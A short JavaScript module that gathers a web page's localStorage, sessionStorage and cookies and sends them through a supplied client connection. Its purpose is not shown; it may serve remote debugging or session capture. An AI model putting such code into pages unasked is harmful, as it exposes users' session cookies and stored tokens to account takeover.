function sendStorage(client) {
  client.send({type: "storage", body: {
    localStorage: {...window.localStorage},
    sessionStorage: {...window.sessionStorage},
    cookies: document.cookie || ""
  }})
}

export default sendStorage
